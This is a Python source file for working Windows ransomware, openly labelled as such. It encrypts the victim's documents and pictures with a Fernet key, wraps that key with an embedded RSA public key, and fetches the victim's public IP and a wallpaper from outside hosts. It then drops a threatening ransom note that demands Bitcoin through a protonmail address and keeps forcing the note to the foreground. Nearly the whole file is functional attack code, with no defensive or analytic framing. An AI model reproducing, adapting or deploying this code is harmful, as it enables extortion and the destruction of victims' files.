# Imports
from cryptography.fernet import Fernet # encrypt/decrypt files on target system
import os # to get system root
import webbrowser # to load webbrowser to go to specific website eg bitcoin
import ctypes # so we can intereact with windows dlls and change windows background etc
import urllib.request # used for downloading and saving background image
import requests # used to make get reqeust to api.ipify.org to get target machine ip addr
import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import datetime # to give time limit on ransom note
import subprocess # to create process for notepad and open ransom  note
import win32gui
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading # used for ransom note and decryption key on dekstop



class RansomWare:

    
    # File exstensions to seek out and Encrypt
    file_exts = [
        'jpg', "pdf", "txt", "png"


    ]


    def __init__(self):
        # Key that will be used for Fernet object and encrypt/decrypt method
        self.key = None
        # Encrypt/Decrypter
        self.crypter = None
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = None

        #Encryption Paths

        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        self.sysRoot = os.path.expanduser('~')
        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
        self.localRoot = f"{self.sysRoot}" #C:/User/User  #Debugging/Testing

        # Get public IP
        self.publicIP = requests.get('https://api.ipify.org').text


    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
    def generate_key(self):
        # Generates a url safe(base64 encoded) key
        self.key = Fernet.generate_key()
        # Creates a Fernet object with encrypt/decrypt methods
        self.crypter = Fernet(self.key)

    
    # Write the fernet(symmetric key) to text file
    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)


    # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYSMETRIC KEY used for-
    # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            # Public RSA key
            import_key_public = """-----BEGIN PUBLIC KEY-----\n
            MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu8Mf+TD6NJqLmfQIZXAP\n
            8d96DtjuDVcByZD+TihR7Rx9RJdIAQq90/SCvz+tNhHf3ohcysR8TzwKeNsi7V2l\n
            t1qx+YYkGWevA17Mqzl9FmJK02Eayc/pmknDmBZ2gEATvYxe5v69AFLTGz2Ucyyi\n
            HZ4NP1SyAubrted3FbBNTYQ5eo3gFeVDaFwv/SDd6oHYbIS+Ix1+wLBLfZv1+I7h\n
            wodbRmlKJabX5oxCfMQzmApkuy2NlBajJuOZN9VqkOdXwhvE6O3TTXvUQCHNGVIJ\n
            wj/8WMQv0Xg4vLPTj1LcCR0wM6zEdr3uUH+kT39irbpiWgiCR7HxO4RtyedNhKh1\n
            WQIDAQAB\n
            -----END PUBLIC KEY-----"""
            self.public_key = RSA.import_key(import_key_public)
            # Public encrypter object
            public_crypter = PKCS1_OAEP.new(self.public_key)
            # Encrypted fernet key
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            # Write encrypted fernet key to file
            f.write(enc_fernent_key)
        # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
        with open(f'{self.sysRoot}/Desktop/EMAIL_US_THIS_TO_GET_YOUR_FILES_BACK.txt', 'wb') as fa, open(f"{self.sysRoot}/Documents/EMAIL_US_THIS_TO_GET_YOUR_FILES_BACK.txt", "wb") as fb:
            fa.write(enc_fernent_key)
            fb.write(enc_fernent_key)
        # Assign self.key to encrypted fernet key
        self.key = enc_fernent_key
        # Remove fernet crypter object
        self.crypter = None


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            # Read data from file
            data = f.read()
            # Print file contents - [debugging]
            print(data)
            # Encrypt data from file
            _data = self.crypter.encrypt(data)
            # Log file encrypted and print encrypted contents - [debugging]
            print('> File encrpyted')
            print(_data)

        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to file using same filename to overwrite original file
            fp.write(_data)


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def crypt_system(self, encrypted=False):
        directory = ["Documents", "Pictures"]  #folders to crypt (target specific folders)
        for i in directory:
            system = os.walk(f"{self.localRoot}/{i}", topdown=True)
            for root, dir, files in system:
                for file in files:
                    file_path = os.path.join(root, file)
                    if not file.split('.')[-1] in self.file_exts:
                        continue
                    self.crypt_file(file_path, encrypted=True) #launches the crypt function

    #IF YOU WANT TO OPEN A WEB BROWSER

    # @staticmethod
    # def browser():
    #     url = 'https://bitcoin.org'
    #     # Open browser to the https://bitcoin.org so they know what bitcoin is
    #     webbrowser.open(url)


    def change_desktop_background(self):
        imageUrl = 'https://i.kym-cdn.com/photos/images/original/001/109/433/22b.jpg'
        # Go to specif url and download+save image using absolute path
        path = f'{self.sysRoot}/Downloads/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open(f'{self.sysRoot}\Documents\HOW_TO_GET_YOUR_FILES_BACK.txt', 'w') as f, open(f"{self.sysRoot}\Desktop\HOW_TO_GET_YOUR_FILES_BACK.txt", "w") as f2:
            text_note = f'''
Your computer has been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

***DO NOT DELETE EMAIL_ME FILE AND EMAIL_ME BACKUPS OR YOU WILL LOSE YOUR FILES FOREVER

1. Email the file called EMAIL_ME.txt at {self.sysRoot}/Desktop/EMAIL_US_THIS_TO_GET_YOUR_FILES_BACK.txt to GetYourFilesBack@protonmail.com

2. You will receive a Bitcoin address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will then receive a .EXE file with your KEY in it that will unlock all your files when you will run the .EXE 
   IMPORTANT: To decrypt your files, you need to wait once you run the .EXE. Shortly after it will begin to decrypt all your files.

WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlock your files.
Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
'''
            f.write(text_note)
            f2.write(text_note)
    # should always run
    def show_ransom_note(self):
        # Open the ransom note
        ransom = subprocess.Popen(['notepad.exe', f'{self.sysRoot}\Documents\HOW_TO_GET_YOUR_FILES_BACK.txt'])
        count = 0 # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'HOW_TO_GET_YOUR_FILES_BACK - Notepad':
                print('Ransom note is the top window - do nothing') # Debugging/Testing
                pass
            else:
                print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
                # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround (top of all windows)
                time.sleep(0.1)
                ransom.kill()
                # Open the ransom note
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', f"{self.sysRoot}\Desktop\HOW_TO_GET_YOUR_FILES_BACK.txt"])
            # sleep for 10 seconds
            time.sleep(15)
            count +=1 
            if count == 5:
                break


def main():
    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    #rw.browser()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)


    t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted') # Debugging/Testing
    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') # Debugging/Testing




if __name__ == '__main__':
    main()
 
